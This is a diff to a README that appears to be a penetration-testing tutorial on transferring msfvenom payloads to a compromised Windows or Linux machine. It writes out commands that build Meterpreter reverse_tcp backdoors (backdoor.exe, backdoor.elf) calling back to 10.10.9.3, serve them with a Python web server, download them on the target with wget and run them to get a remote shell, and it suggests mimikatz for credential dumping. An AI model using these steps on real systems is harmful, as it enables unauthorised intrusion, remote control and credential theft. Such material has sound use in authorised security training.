@@ -1,4 +1,4 @@
-# Trasferring-Malicious-Payload-MSFvenom-To-The-Target-System
+# Trasferring-Malicious-Payload-MSFvenom-to-the-Target-System
 Let's introduce how to transferring files on Target Machine (Windows &amp; Linux)
 # Introduction MSFvenom
 Msftvenom is a tool for generating and encoding payloads for penetration testing. It is part of the Metasploit Framework, a popular suite of tools for security professionals. Msftvenom can create payloads for various platforms and formats, and it can also apply different encoders to evade detection. The purpose of msftvenom is to create malicious code that can be injected into a target system to gain access or execute commands.<br>
@@ -39,9 +39,10 @@ Options:<br>
 
 
 ## Example of trasferring malicious payload<br>
+### Windows System
 We are in Post Explotation phase, so you need an initial access on the Target.  <br>
 I transferred a payload created by msfvenom, but you can transfer all files you need, like mimikatz.exe to perform credentials dumping, etc. <br><br>
-**Command to generate a malicious payload (reverse_tcp): msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.9.3 LPORT=4444 -f exe > 'backdoor.exe' (set LPORT and LHOST where you want to receive the connection) <br>**
+**Command to generate a malicious payload (reverse_tcp): msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.9.3 LPORT=4444 -f exe > 'backdoor.exe' (set LPORT and LHOST where you want to receive the connection. Default is x86, if need x64, you have to specify it) <br>**
 <img src="venompayload.png" width=85% height="auto"><br><br>
 **Setting up the web server: python3 -m http.server 80 <br>**
 <img src="python.png" width=70% height="auto"><br><br>
@@ -51,8 +52,10 @@ I transferred a payload created by msfvenom, but you can transfer all files you 
 <img src="handler.png" width=50% height="auto"><br><br>
 **Execute the backdoor.exe on the Target and you got a Meterpreter Session on your Machine**
 
-
-
+### Linux System
+It's the same thing but u have to change the creation of payload and use another tool for download the file
+ - **Command to generate a malicious payload (reverse_tcp): msfvenom -p linux/meterpreter/reverse_tcp LHOST=10.10.9.3 LPORT=4444 -f elf > 'backdoor.elf' (set LPORT and LHOST where you want to receive the connection. Default is x86, if need x64, you have to specify it) <br>**
+ - **Download the payload with wget: wget http://10.10.9.3/backdoor.elf <br>**
 
 
 #Author
